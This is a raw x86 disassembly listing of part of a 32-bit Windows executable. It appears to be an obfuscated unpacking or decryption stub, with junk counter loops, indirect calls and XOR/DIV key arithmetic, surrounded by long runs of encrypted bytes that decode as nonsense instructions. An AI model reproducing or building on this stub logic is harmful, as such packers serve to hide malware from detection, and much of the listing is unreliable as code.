  4018bd:	cmp    DWORD PTR ds:0x430363,0x7
  4018c4:	jne    0x4018d7
  4018ca:	mov    esi,DWORD PTR ds:0x430363
  4018d0:	inc    esi
  4018d1:	mov    DWORD PTR ds:0x430363,esi
  4018d7:	jmp    0x401889
  4018dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4018df:	add    esi,DWORD PTR ds:0x42ec57
  4018e5:	mov    DWORD PTR [ecx],eax
  4018e7:	and    DWORD PTR ds:0x42ec5b,0x0
  4018f1:	mov    esi,DWORD PTR ds:0x42ec5b
  4018f7:	inc    esi
  4018f8:	mov    DWORD PTR ds:0x42ec5b,esi
  4018fe:	cmp    DWORD PTR ds:0x42ec5b,0xb
  401905:	jne    0x401914
  40190b:	push   DWORD PTR [ebp-0x1c]
  40190e:	call   DWORD PTR ds:0x42ea8f
  401914:	cmp    DWORD PTR ds:0x42ec5b,0xa
  40191b:	jne    0x40192e
  401921:	mov    esi,DWORD PTR ds:0x42ec5b
  401927:	inc    esi
  401928:	mov    DWORD PTR ds:0x42ec5b,esi
  40192e:	cmp    DWORD PTR ds:0x42ec5b,0x17
  401935:	jb     0x4018f1
  40193b:	sbb    DWORD PTR ds:0x42ec4b,0x20dd
  401945:	mov    ecx,0x7510854
  40194a:	and    DWORD PTR ds:0x43035b,0x0
  401954:	jmp    0x401966
  401959:	mov    esi,DWORD PTR ds:0x43035b
  40195f:	inc    esi
  401960:	mov    DWORD PTR ds:0x43035b,esi
  401966:	cmp    DWORD PTR ds:0x43035b,0x12
  40196d:	jae    0x4019a5
  401973:	cmp    DWORD PTR ds:0x43035b,0x22
  40197a:	jne    0x40199a
  401980:	push   0x7ffb
  401985:	push   0x8364
  40198a:	push   0x42e737
  40198f:	push   0x6aad
  401994:	call   DWORD PTR ds:0x42e917
  40199a:	jmp    0x401959
  40199f:	sbb    esi,DWORD PTR ds:0x4302bd
  4019a5:	mov    esi,0x32729b
  4019aa:	push   ebx
  4019ab:	and    DWORD PTR ds:0x4302b5,0x0
  4019b5:	xor    ebx,ebx
  4019b7:	or     ebx,DWORD PTR ds:0x4302b5
  4019bd:	inc    ebx
  4019be:	mov    DWORD PTR ds:0x4302b5,ebx
  4019c4:	cmp    DWORD PTR ds:0x4302b5,0x19
  4019cb:	jne    0x4019e5
  4019d1:	push   0x42e7c5
  4019d6:	push   DWORD PTR [ebp-0x20]
  4019d9:	push   DWORD PTR [ebp-0x10]
  4019dc:	push   DWORD PTR [ebp-0xc]
  4019df:	call   DWORD PTR ds:0x42e83b
  4019e5:	cmp    DWORD PTR ds:0x4302b5,0x16
  4019ec:	jb     0x4019b5
  4019f2:	mov    ax,WORD PTR [ebp-0x24]
  4019f6:	movzx  eax,ax
  4019f9:	mov    DWORD PTR [ebp-0x38],eax
  4019fc:	mov    eax,DWORD PTR [ebp+0x8]
  4019ff:	mov    DWORD PTR [ebp-0x28],eax
  401a02:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  401a09:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  401a10:	mov    eax,0x9577
  401a15:	mov    WORD PTR [ebp-0x4],ax
  401a19:	lea    eax,[ebp-0x30]
  401a1c:	mov    DWORD PTR [ebp-0x34],eax
  401a1f:	mov    eax,DWORD PTR [ebp-0x28]
  401a22:	mov    DWORD PTR [ebp-0x2c],eax
  401a25:	lea    eax,[ebp-0x18]
  401a28:	mov    DWORD PTR [ebp-0x1c],eax
  401a2b:	mov    eax,DWORD PTR [ebp-0x1c]
  401a2e:	mov    DWORD PTR [eax],0xf89f2da9
  401a34:	mov    eax,DWORD PTR [ebp-0x14]
  401a37:	mov    ebx,DWORD PTR [ebp-0x8]
  401a3a:	xor    eax,ecx
  401a3c:	xor    ebx,ecx
  401a3e:	xor    edx,edx
  401a40:	add    eax,esi
  401a42:	add    ebx,esi
  401a44:	div    ebx
  401a46:	mov    edx,DWORD PTR [ebp-0x2c]
  401a49:	cmp    eax,DWORD PTR [edx]
  401a4b:	je     0x402095
  401a51:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401a58:	jmp    0x401c1b
  401a5d:	mov    DWORD PTR [ebp-0x5a],0xc159a499
  401a64:	popa   
  401a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a66:	ja     0x401a61
  401a68:	and    eax,0x722016f9
  401a6d:	xchg   esi,eax
  401a6e:	js     0x401aee
  401a70:	jle    0x401a0a
  401a72:	jg     0x401af2
  401a74:	jle    0x401a9a
  401a76:	loope  0x401a6a
  401a78:	(bad)
  401a7d:	dec    eax
  401a7e:	mov    dl,0x4b
  401a80:	retf   0x983e
  401a83:	stos   DWORD PTR es:[edi],eax
  401a84:	dec    ecx
  401a85:	lea    esi,[ebx+0x6cb63829]
  401a8b:	mov    ds:0xb9d30622,eax
  401a90:	retf   
  401a91:	pop    ecx
  401a92:	mov    bl,al
  401a94:	call   0x7d58f5f4
  401a99:	xor    eax,esp
  401a9b:	sub    BYTE PTR [eax-0x3],dh
  401a9e:	push   ebx
  401a9f:	hlt    
  401aa0:	jle    0x401ad9
  401aa2:	push   esp
  401aa3:	adc    dh,BYTE PTR [ebx+0x7993c626]
  401aa9:	add    edx,DWORD PTR [edi+0x65784c1a]
  401aaf:	mov    dl,0x7a
  401ab1:	sahf   
  401ab2:	jmp    0x401a71
  401ab4:	add    dh,cl
  401ab6:	dec    edi
  401ab7:	fwait
  401ab8:	in     al,0x9b
  401aba:	inc    esp
  401abb:	dec    ebp
  401abc:	fsubr  QWORD PTR [ebp-0x65ab2d4a]
  401ac2:	aam    0x92
  401ac4:	dec    ebx
  401ac5:	call   FWORD PTR ds:0xc11cf3bd
  401acb:	lock or BYTE PTR [edx+0x16],bl
  401acf:	cmp    ebx,DWORD PTR [edx+esi*2-0x16]
  401ad3:	mov    ebx,DWORD PTR [ecx-0x73dc35c9]
  401ad9:	retf   
  401ada:	js     0x401ae4
  401adc:	mov    eax,ds:0xb6bff8fa
  401ae1:	scas   eax,DWORD PTR es:[edi]
  401ae2:	adc    eax,0x31627d41
  401ae7:	and    al,0xe6
  401ae9:	mov    bh,0x71
  401aeb:	(bad)  
  401aec:	dec    ecx
  401aed:	sbb    dl,BYTE PTR [ecx+0x74]
  401af0:	rcr    BYTE PTR [esp+ebp*1],1
  401af3:	pop    edi
  401af4:	sbb    eax,0x822e83da
  401af9:	mov    esp,0x28d7b8e8
  401afe:	xchg   BYTE PTR [edx-0x7816d54b],al
  401b04:	daa    
  401b05:	mov    ds:0xddfbe2e9,al
  401b0a:	dec    edx
  401b0b:	dec    eax
  401b0c:	(bad)  
  401b0d:	adc    eax,0xe0462199
  401b12:	not    BYTE PTR [esp+ecx*8+0x7a68631e]
  401b19:	inc    ecx
  401b1a:	repz jmp 0x401b70
  401b1d:	adc    eax,0x2c65b8bf
  401b22:	cmp    bh,al
  401b24:	xlat   BYTE PTR ds:[ebx]
  401b25:	mov    ds:0x84706c1c,al
  401b2a:	aam    0x5b
  401b2c:	das    
  401b2d:	and    esi,DWORD PTR [ecx-0x2a]
  401b30:	ret    
  401b31:	rcl    DWORD PTR [ebp+0x9],1
  401b34:	or     ebp,0x9da22675
  401b3a:	js     0x401b28
  401b3c:	sub    BYTE PTR [ecx+0x1a],al
  401b3f:	xchg   ebp,eax
  401b40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b41:	dec    edi
  401b42:	loopne 0x401ad1
  401b44:	dec    ebx
  401b45:	nop
  401b46:	paddusw mm1,mm3
  401b49:	jmp    0xafd3:0x79adf18c
  401b50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b51:	out    dx,al
  401b52:	(bad)  
  401b53:	fbld   TBYTE PTR [eax]
  401b55:	push   0xffffffee
  401b57:	lds    esp,FWORD PTR [ecx-0x23]
  401b5a:	xor    DWORD PTR [ecx],esp
  401b5c:	in     eax,0xd9
  401b5e:	push   ecx
  401b5f:	push   0x93c19f7
  401b64:	mov    dl,0xa1
  401b66:	adc    al,0xc8
  401b68:	push   ss
  401b69:	mov    edi,0x9be568c5
  401b6e:	lods   eax,DWORD PTR ds:[esi]
  401b6f:	aam    0xac
  401b71:	pop    ss
  401b72:	push   edx
  401b73:	or     cl,BYTE PTR [ebp-0x17]
  401b76:	mov    cl,0x1c
  401b78:	lods   eax,DWORD PTR ds:[esi]
  401b79:	hlt    
  401b7a:	pop    ebp
  401b7b:	inc    eax
  401b7c:	push   0x6d
  401b7e:	or     al,0xe0
  401b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b81:	adc    eax,0x1b97acc6
  401b86:	jge    0x401bd6
  401b88:	xchg   ecx,eax
  401b89:	sub    DWORD PTR [ecx],esp
  401b8b:	mov    edx,0x3a883ba0
  401b90:	mov    dl,dh
  401b92:	jb     0x401b94
  401b94:	inc    ebp
  401b95:	scas   al,BYTE PTR es:[edi]
  401b96:	xor    ch,ch
  401b98:	cmp    bh,BYTE PTR [ebx]
  401b9a:	push   ebx
  401b9b:	cwde   
  401b9c:	shl    DWORD PTR [edx-0x621b2255],1
  401ba2:	lahf   
  401ba3:	push   0xffffffa6
  401ba5:	pop    ecx
  401ba6:	inc    ebx
  401ba7:	pop    ds
  401ba8:	pop    ss
  401ba9:	scas   eax,DWORD PTR es:[edi]
  401baa:	jmp    0x40cf:0xa62b1877
  401bb1:	inc    ebx
  401bb2:	jbe    0x401b49
  401bb4:	mov    edi,0x1fa8661a
  401bb9:	mov    ebp,0x6515030b
  401bbe:	push   esi
  401bbf:	mov    eax,0xe2c75790
  401bc4:	pusha  
  401bc5:	pusha  
  401bc6:	(bad)  
  401bc7:	push   ebx
  401bc8:	mov    ss,WORD PTR [edx+0x7e]
  401bcb:	or     edx,DWORD PTR [esi+0x66]
  401bce:	jp     0x401bb4
  401bd0:	mov    gs,WORD PTR [edx-0x376634e7]
  401bd6:	repnz xchg esi,eax
  401bd8:	ror    BYTE PTR [ebx],1
  401bda:	frstor [eiz*8-0x20628076]
  401be1:	pop    ss
  401be2:	cld    
  401be3:	nop
  401be4:	cmp    BYTE PTR [ecx],al
  401be6:	cmp    DWORD PTR cs:[ebp-0x43],ebp
  401bea:	add    ah,BYTE PTR [esi+0x2dab0c70]
  401bf0:	movaps XMMWORD PTR [ebx-0x158e1fc4],xmm3
  401bf7:	outs   dx,DWORD PTR ds:[esi]
  401bf8:	mov    dl,0x50
  401bfa:	mov    ch,0xa7
  401bfc:	sub    bl,dl
  401bfe:	ins    DWORD PTR es:[edi],dx
  401bff:	xor    DWORD PTR cs:[edx+0x52d0f343],0x2a
  401c07:	inc    ebp
  401c08:	dec    esp
  401c09:	dec    ebp
  401c0a:	mov    bh,0x6d
  401c0c:	push   ecx
  401c0d:	inc    esi
  401c0e:	dec    edx
  401c0f:	icebp  
  401c10:	mov    ds:0xb429fd95,al
  401c15:	pop    ecx
  401c16:	inc    esp
  401c17:	sub    ch,0xbd
  401c1a:	dec    ecx
  401c1b:	lea    eax,[ebp-0xc]
  401c1e:	mov    DWORD PTR [ebp-0x10],eax
  401c21:	mov    eax,DWORD PTR [ebp-0x10]
  401c24:	mov    edx,DWORD PTR [eax]
  401c26:	imul   edx,edx,0xf89ea9ee
  401c2c:	mov    DWORD PTR [eax],edx
  401c2e:	mov    eax,DWORD PTR [ebp-0xc]
  401c31:	cmp    eax,0x823721f2
  401c36:	je     0x401c4a
  401c3c:	mov    eax,DWORD PTR [ebp-0x1c]
  401c3f:	or     DWORD PTR [eax],0x60751c9e
  401c45:	jmp    0x4020a4
  401c4a:	mov    eax,DWORD PTR [ebp-0xc]
  401c4d:	add    eax,DWORD PTR [ebp-0x18]
  401c50:	cmp    eax,0x7ad64f9b
  401c55:	je     0x401c69
  401c5b:	mov    eax,DWORD PTR [ebp-0x10]
  401c5e:	and    DWORD PTR [eax],0x751c99
  401c64:	jmp    0x4020a4
  401c69:	mov    eax,DWORD PTR [ebp-0xc]
  401c6c:	mov    edx,DWORD PTR [ebp-0x18]
  401c6f:	or     eax,edx
  401c71:	cmp    eax,0xfabf2dfb
  401c76:	je     0x401e4d
  401c7c:	mov    eax,DWORD PTR [ebp-0x10]
  401c7f:	jmp    0x401e42
  401c84:	das    
  401c85:	adc    bh,cl
  401c87:	inc    edx
  401c88:	icebp  
  401c89:	inc    ecx
  401c8a:	mov    bl,0x71
  401c8c:	test   DWORD PTR [edx],ebx
  401c8e:	and    bl,BYTE PTR [esi]
  401c90:	xchg   ebx,eax
  401c91:	loopne 0x401c98
  401c93:	dec    esi
  401c94:	xor    BYTE PTR [esi],al
  401c96:	jle    0x401d16
  401c98:	cwde   
  401c99:	jg     0x401d19
  401c9b:	jle    0x401cfb
  401c9d:	or     BYTE PTR [ebx+0x78],0x40
  401ca1:	adc    esp,DWORD PTR [eax-0x4bdcd78c]
  401ca7:	push   edx
  401ca8:	dec    esp
  401ca9:	es retf 0xaa01
  401cad:	in     al,0x20
  401caf:	loopne 0x401cab
  401cb1:	jmp    0xa800:0xdbe68a9c
  401cb8:	(bad)
  401cbd:	pop    ds
  401cbe:	fadd   DWORD PTR [edx]
  401cc0:	in     eax,0x22
  401cc2:	daa    
  401cc3:	adc    bl,dl
  401cc5:	jge    0x401cdb
  401cc7:	popa   
  401cc8:	mov    ecx,0xb9113c19
  401ccd:	imul   esi,DWORD PTR [ebp+0x2f],0x82e7ea7d
  401cd4:	aas    
  401cd5:	pop    edi
  401cd6:	adc    bl,BYTE PTR [ecx]
  401cd8:	pop    edi
  401cd9:	xchg   ecx,eax
  401cda:	jnp    0x401d2d
  401cdc:	stos   BYTE PTR es:[edi],al
  401cdd:	dec    ebx
  401cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cdf:	jle    0x401cb1
  401ce1:	inc    eax
  401ce2:	loop   0x401cd8
  401ce4:	retf   0x623c
  401ce7:	add    edi,DWORD PTR ds:0xa32090f6
  401ced:	hlt    
  401cee:	retf   0x8e93
  401cf1:	xchg   ecx,eax
  401cf2:	mov    al,0xf
  401cf4:	jp     0x401d22
  401cf6:	adc    al,0x15
  401cf8:	cmc    
  401cf9:	shr    DWORD PTR [ecx+0x50c997bf],1
  401cff:	cmp    al,bh
  401d01:	and    eax,DWORD PTR [edi-0x62a46b77]
  401d07:	retf   
  401d08:	dec    ebx
  401d09:	sti    
  401d0a:	pop    ecx
  401d0b:	sub    eax,edx
  401d0d:	div    BYTE PTR [esi-0x6255f9d7]
  401d13:	pop    ebp
  401d14:	cld    
  401d15:	inc    esi
  401d16:	add    eax,0x63cf0469
  401d1b:	stc    
  401d1c:	jne    0x401d58
  401d1e:	ror    DWORD PTR [eax+0x5734abef],0x9b
  401d25:	xor    eax,0x3e5f9417
  401d2a:	and    bl,BYTE PTR [edi+0x15170506]
  401d30:	xchg   esi,eax
  401d31:	into   
  401d32:	xlat   BYTE PTR ds:[ebx]
  401d33:	repnz bound edi,QWORD PTR [esi]
  401d36:	rcl    BYTE PTR [ebx],0x92
  401d39:	sbb    ah,BYTE PTR [edi+0x43f2d06d]
  401d3f:	es or  eax,0xcea72f07
  401d45:	or     DWORD PTR fs:[ecx+0x100191ac],edx
  401d4c:	mov    al,ds:0x183275c2
  401d51:	push   0xffffff80
  401d53:	pop    edx
  401d54:	push   edi
  401d55:	inc    esp
  401d56:	lea    ebx,[edx]
  401d58:	lds    ebx,FWORD PTR ds:0xb3c7a393
  401d5e:	jg     0x401cf8
  401d60:	push   ebp
  401d61:	or     al,0xe1
  401d63:	push   eax
  401d64:	xchg   ebx,eax
  401d65:	neg    BYTE PTR gs:[ecx+0x71]
  401d69:	daa    
  401d6a:	adc    ecx,DWORD PTR [ebx+esi*4+0x596dd0a1]
  401d71:	sahf   
  401d72:	cdq    
  401d73:	cmp    dl,BYTE PTR [ebx+eax*1]
  401d76:	(bad)  
  401d77:	aad    0xe6
  401d79:	aas    
  401d7a:	adc    edi,eax
  401d7c:	lock jg 0x401dbd
  401d7f:	shr    dl,1
  401d81:	add    eax,ebx
  401d83:	ds out 0x8a,al
  401d86:	jge    0x401dc9
  401d88:	adc    DWORD PTR [edx],0x17
  401d8b:	div    DWORD PTR [esi]
  401d8d:	xor    DWORD PTR [ebx+0x4e],0x921c98c1
  401d94:	cli    
  401d95:	push   esi
  401d96:	bound  edi,QWORD PTR ds:0x7701db49
  401d9c:	and    dl,BYTE PTR [eax-0x11]
  401d9f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  401da1:	jnp    0x401e0f
  401da3:	in     eax,dx
  401da4:	jns    0x401de4
  401da6:	cdq    
  401da7:	(bad)  
  401da8:	out    0xcb,eax
  401daa:	xchg   esi,eax
  401dab:	cmc    
  401dac:	and    al,0x7a
  401dae:	fcomp  DWORD PTR [eax+0x4492e9fe]
  401db4:	enter  0x87dc,0xdd
  401db8:	je     0x401d8e
  401dba:	jae    0x401e0c
  401dbc:	ret    
  401dbd:	pop    eax
  401dbe:	pop    ecx
  401dbf:	mov    ah,0x32
  401dc1:	ret    0x440f
  401dc4:	fldcw  WORD PTR [ebx+eax*8-0x7b]
  401dc8:	int    0x9a
  401dca:	sub    ebp,esi
  401dcc:	fdiv   QWORD PTR [ecx]
  401dce:	xchg   edx,eax
  401dcf:	div    BYTE PTR ds:[ebx-0x1f56e1ec]
  401dd6:	or     DWORD PTR [edi+0x38af5730],ebx
  401ddc:	adc    ah,0xae
  401ddf:	and    bh,BYTE PTR [ebp+0x2c6882da]
  401de5:	add    bh,BYTE PTR [edx+0x553fb2d0]
  401deb:	addr16 sti 
  401ded:	jge    0x401e1f
  401def:	xchg   esp,eax
  401df0:	and    BYTE PTR ds:0x3ce929f3,0x80
  401df7:	adc    al,0xf1
  401df9:	jmp    0x9d6a:0x41eeb656
  401e00:	pop    ds
  401e01:	xchg   ecx,eax
  401e02:	add    edx,DWORD PTR [ecx-0x2443dcc3]
  401e08:	aas    
  401e09:	sti    
  401e0a:	fsub   DWORD PTR [edx+eax*4-0x14]
  401e0e:	cli    
  401e0f:	ret    0x215
  401e12:	(bad)  [esi+edi*2-0x67]
  401e16:	pop    esi
  401e17:	imul   esp,DWORD PTR [ecx],0x2f
  401e1a:	cli    
  401e1b:	xor    eax,0x345849ed
  401e20:	and    ebx,DWORD PTR [esi+0x1d]
  401e23:	les    ebp,FWORD PTR [eax-0x74]
  401e26:	stos   BYTE PTR es:[edi],al
  401e27:	fwait
  401e28:	jecxz  0x401ea4
  401e2a:	fsub   QWORD PTR [edx]
  401e2c:	mov    ds:0x1b0ce7bb,eax
  401e31:	into   
  401e32:	xor    dl,ch
  401e34:	mov    WORD PTR [ecx-0x14],es
  401e37:	mov    esp,0x51fe39f0
  401e3c:	gs sti 
  401e3e:	bnd jmp 0x401e49
  401e41:	adc    al,0x81
  401e43:	xor    BYTE PTR [edi-0x16d9af06],cl
  401e49:	push   edi
  401e4a:	add    al,BYTE PTR [eax]
  401e4c:	add    BYTE PTR [esi-0x75],ah
  401e4f:	inc    ebp
  401e50:	cld    
  401e51:	mov    edx,0x8a3c
  401e56:	xor    ax,dx
  401e59:	mov    edx,DWORD PTR [ebp-0x28]
  401e5c:	mov    edx,DWORD PTR [edx]
  401e5e:	add    ax,di
  401e61:	cmp    ax,WORD PTR [edx]
  401e64:	je     0x402074
  401e6a:	mov    eax,DWORD PTR [ebp-0x14]
  401e6d:	xor    eax,ecx
  401e6f:	jmp    0x402032
  401e74:	mov    ebp,0xd91a1ffb
  401e79:	call   0xdfe:0x67459b9
  401e80:	test   eax,0x5ac00010
  401e85:	pop    es
  401e86:	jle    0x401f06
  401e88:	cwde   
  401e89:	jg     0x401f09
  401e8b:	jle    0x401ee6
  401e8d:	leave  
  401e8e:	dec    ebp
  401e8f:	lahf   
  401e90:	jnp    0x401e8b
  401e92:	fst    DWORD PTR ds:0x80d79ab3
  401e98:	dec    edi
  401e99:	ds push es
  401e9b:	enter  0x3137,0x55
  401e9f:	pushf  
  401ea0:	cs mov eax,gs
  401ea3:	sub    DWORD PTR [edi-0x80],edi
  401ea6:	or     al,0x22
  401ea8:	xor    eax,0xe01921f6
  401ead:	inc    edi
  401eae:	cmp    cl,0xfd
  401eb1:	inc    ecx
  401eb2:	mov    dh,0xf1
  401eb4:	dec    esp
  401eb5:	out    0xb0,eax
  401eb7:	xrelease xchg BYTE PTR [ecx-0x56f09e6],bl
  401ebe:	dec    esp
  401ebf:	(bad)  
  401ec0:	popf   
  401ec1:	cmp    eax,0x424033e8
  401ec6:	(bad)  
  401ec7:	aad    0x54
  401ec9:	imul   esp,DWORD PTR [edx+0x43],0xcc6f1d57
  401ed0:	test   eax,0xa63473af
  401ed5:	gs daa 
  401ed7:	std    
  401ed8:	arpl   dx,sp
  401eda:	xor    ax,0x5a
  401ede:	pushf  
  401edf:	jmp    FWORD PTR [eax+0x4c73a283]
  401ee5:	mov    DWORD PTR [esi+0x74],ebx
  401ee8:	xchg   ebp,eax
  401ee9:	mov    ebx,0xaa65ab90
  401eee:	ficom  DWORD PTR [edi+0x14]
  401ef1:	sti    
  401ef2:	sbb    eax,0xc127c813
  401ef7:	addr16 inc esi
  401ef9:	sahf   
  401efa:	in     eax,dx
  401efb:	mov    edi,0x7011442b
  401f00:	add    eax,0x3cf1ca3c
  401f05:	int    0x50
  401f07:	sahf   
  401f08:	or     ebx,DWORD PTR [esi-0x12c321f1]
  401f0e:	js     0x401f08
  401f10:	jmp    0xf3cd:0xe981e5ae
  401f17:	jb     0x401ed6
  401f19:	add    dh,BYTE PTR [ebp-0x765a94ac]
  401f1f:	mov    ebx,0xa4a520d
  401f24:	(bad)  
  401f25:	push   esi
  401f26:	cmp    al,0x11
  401f28:	cmc    
  401f29:	fwait
  401f2a:	es mov edi,0x7cb26a34
  401f30:	push   ss
  401f31:	sub    DWORD PTR [edi+0x1342b37c],0x77
  401f38:	sbb    al,0x7
  401f3a:	mov    ah,0xbb
  401f3c:	dec    eax
  401f3d:	lds    ecx,FWORD PTR [ebx-0x49f58a7d]
  401f43:	repz imul BYTE PTR [ecx+0x2c6d2e45]
  401f4a:	push   ds
  401f4b:	inc    eax
  401f4c:	jl     0x401ef9
  401f4e:	lds    eax,FWORD PTR [ebp+0x52]
  401f51:	dec    edi
  401f52:	jmp    0xb605:0xd683088f
  401f59:	shr    DWORD PTR [ebx-0xf200ce],1
  401f5f:	xchg   ecx,eax
  401f60:	pop    es
  401f61:	sar    ch,0xf0
  401f64:	mov    eax,0x1c94b0fe
  401f69:	popf   
  401f6a:	enter  0x45b2,0x24
  401f6e:	mov    bh,0x1c
  401f70:	adc    DWORD PTR [ecx-0x54],edx
  401f73:	test   BYTE PTR [ecx],dh
  401f75:	mov    ebp,0xb1ebe7c
  401f7a:	sub    DWORD PTR [edx],ecx
  401f7c:	sti    
  401f7d:	dec    esi
  401f7e:	mov    ch,0x25
  401f80:	fbstp  TBYTE PTR [edi+0x6f]
  401f83:	jmp    0x83fa:0x5cf845bf
  401f8a:	dec    esp
  401f8b:	and    esp,DWORD PTR [edx]
  401f8d:	xlat   BYTE PTR ds:[ebx]
  401f8e:	ins    DWORD PTR es:[edi],dx
  401f8f:	hlt    
  401f90:	jns    0x401f93
  401f92:	int    0x4
  401f94:	dec    esp
  401f95:	mov    gs,ebx
  401f97:	jp     0x401f82
  401f99:	jg     0x401f78
  401f9b:	popf   
  401f9c:	and    DWORD PTR [ebx+edx*4],esp
  401f9f:	daa    
  401fa0:	and    BYTE PTR [edi],al
  401fa2:	ret    
  401fa3:	push   esi
  401fa4:	test   dl,0xb
  401fa7:	test   DWORD PTR [eax+edi*4+0x2d],eax
  401fab:	cmp    eax,0xde769dc
  401fb0:	bound  eax,QWORD PTR [edx]
  401fb2:	mov    di,0x5d13
  401fb6:	neg    DWORD PTR [eax+0x2cb4b85e]
  401fbc:	sar    DWORD PTR [esi],1
  401fbe:	push   ds
  401fbf:	inc    esp
  401fc0:	jne    0x401f85
  401fc2:	push   cs
  401fc3:	out    0x73,eax
  401fc5:	fild   QWORD PTR [ebx]
  401fc7:	dec    esi
  401fc8:	xor    eax,0x7edecb3c
  401fcd:	pop    esp
  401fce:	lods   eax,DWORD PTR ds:[esi]
  401fcf:	sbb    eax,0xe2bc1d76
  401fd4:	push   esp
  401fd5:	stos   DWORD PTR es:[edi],eax
  401fd6:	push   ss
  401fd7:	call   0x17d469a8
  401fdc:	arpl   ax,ax
  401fde:	or     BYTE PTR [esi-0x77],ah
  401fe1:	mov    DWORD PTR [ecx],ecx
  401fe3:	leave  
  401fe4:	inc    ebx
  401fe5:	pop    esi
  401fe6:	inc    ecx
  401fe7:	mov    al,BYTE PTR [eax]
  401fe9:	xor    BYTE PTR [ebx],dh
  401feb:	push   esp
  401fec:	dec    ebx
  401fed:	mov    eax,0xb6f9aaa2
  401ff2:	or     eax,0xd89c12d4
  401ff7:	dec    ebp
  401ff8:	push   ds
  401ff9:	and    BYTE PTR [esi-0x24f14c22],al
  401fff:	lods   eax,DWORD PTR ds:[esi]
  402000:	mov    edx,0xe3e28a33
  402005:	lahf   
  402006:	in     eax,dx
  402007:	mov    al,ds:0x5bb9ce44
  40200c:	popf   
  40200d:	dec    edi
  40200e:	out    0xec,eax
  402010:	dec    BYTE PTR [eax-0x33cbe68]
  402016:	push   0x15
  402018:	jmp    0x584f:0x3e00c927
  40201f:	test   al,0xdf
  402021:	icebp  
  402022:	fdivr  DWORD PTR [edi-0x1a6cecfb]
  402028:	cld    
  402029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40202a:	test   BYTE PTR [ecx],bl
  40202c:	pop    ebp
  40202d:	sahf   
  40202e:	out    dx,al
  40202f:	lahf   
  402030:	test   BYTE PTR [esi+0x3],bl
  402033:	(bad)  
  402034:	mov    DWORD PTR [ebp-0x30],eax
  402037:	mov    eax,DWORD PTR [ebp-0x34]
  40203a:	mov    dx,WORD PTR [ebp-0x38]
  40203e:	mov    ebx,0x8a3c
  402043:	xor    dx,bx
  402046:	mov    ebx,DWORD PTR [ebp-0x8]
  402049:	add    dx,di
  40204c:	movzx  edx,dx
  40204f:	xor    ebx,ecx
  402051:	lea    edx,[edx+ebx*1+0x32729b]
  402058:	add    DWORD PTR [eax],edx
  40205a:	mov    eax,DWORD PTR [ebp-0x2c]
  40205d:	mov    edx,DWORD PTR [ebp-0x8]
  402060:	mov    ebx,DWORD PTR [ebp-0x30]
  402063:	xor    edx,ecx
  402065:	add    edx,esi
  402067:	imul   edx,ebx
  40206a:	sub    DWORD PTR [eax],edx
  40206c:	mov    eax,DWORD PTR [ebp-0x14]
  40206f:	jmp    0x4020a7
  402074:	mov    eax,DWORD PTR [ebp-0xc]
  402077:	mov    edx,DWORD PTR [ebp-0x18]
  40207a:	xor    eax,edx
  40207c:	cmp    eax,0x7aa80c5b
  402081:	je     0x4020a4
  402087:	mov    eax,DWORD PTR [ebp-0x10]
  40208a:	add    DWORD PTR [eax],0x7403501
  402090:	jmp    0x4020a4
  402095:	mov    eax,DWORD PTR [ebp-0x1c]
  402098:	cmp    DWORD PTR [eax],0xf89f2da9
  40209e:	jne    0x4020bf
  4020a4:	mov    eax,DWORD PTR [ebp-0x8]
  4020a7:	xor    eax,ecx
  4020a9:	add    eax,esi
  4020ab:	test   eax,eax
  4020ad:	jne    0x4020bf
  4020b3:	xor    DWORD PTR [ebp-0x20],0xe149eb8
  4020ba:	jmp    0x4019ab
  4020bf:	pop    ebx
  4020c0:	pop    edi
  4020c1:	pop    esi
  4020c2:	leave  
  4020c3:	ret    0x4
  4020c6:	push   ebp
  4020c7:	mov    ebp,esp
  4020c9:	sub    esp,0x28
  4020cc:	leave  
  4020cd:	ret    0x10
  4020d0:	push   ebp
  4020d1:	mov    ebp,esp
  4020d3:	jmp    0x4022cb
  4020d8:	outs   dx,BYTE PTR ds:[esi]
  4020d9:	jecxz  0x402113
  4020db:	mov    ecx,0xf16f6151
  4020e0:	jne    0x402154
  4020e2:	add    al,0xd
  4020e4:	lods   al,BYTE PTR ds:[esi]
  4020e5:	hlt    
  4020e6:	shl    DWORD PTR [edx],cl
  4020e8:	test   BYTE PTR ds:0x7f557e7e,al
  4020ee:	jle    0x40216e
  4020f0:	xor    DWORD PTR [edi],ecx
  4020f2:	mov    ds:0x701e3f58,al
  4020f7:	aad    0x9d
  4020f9:	sahf   
  4020fa:	sub    dl,BYTE PTR [ebx]
  4020fc:	jecxz  0x402115
  4020fe:	mov    BYTE PTR [edx-0x7992510b],dh
  402104:	and    bh,BYTE PTR [esi+0xc]
  402107:	ficom  WORD PTR [ebx-0x1a]
  40210a:	xor    al,0x4a
  40210c:	xchg   cx,ax
  40210e:	or     BYTE PTR [edx+edx*4-0x6da97e18],al
  402115:	mov    dl,BYTE PTR [eax+0x4c]
  402118:	loop   0x402161
  40211a:	dec    ebp
  40211b:	shl    BYTE PTR [eax],1
  40211d:	adc    BYTE PTR [esi-0x78],ch
  402120:	test   BYTE PTR [ebx-0x17dcbd8],ah
  402126:	repz (bad) 
  402128:	cmp    esi,ebp
  40212a:	adc    eax,0xd6fa8de6
  40212f:	mov    al,0x7f
  402131:	push   0xdc771eec
  402136:	adc    al,0x83
  402138:	out    0x18,al
  40213a:	mov    eax,0x52f3e22d
  40213f:	adc    al,0xfe
  402141:	idiv   DWORD PTR [ebx-0x10a6f817]
  402147:	dec    esp
  402148:	adc    esp,DWORD PTR [esp+ebx*2+0x31]
  40214c:	jae    0x402119
  40214e:	shl    DWORD PTR [edx],cl
  402150:	dec    ebx
  402151:	inc    ecx
  402152:	and    eax,0xf1f6b938
  402157:	or     DWORD PTR [edx],ebx
  402159:	pop    DWORD PTR [eax-0x71]
  40215c:	xchg   edx,eax
  40215d:	sar    cl,cl
  40215f:	mov    BYTE PTR [ecx],ah
  402161:	or     eax,0xe254a4d4
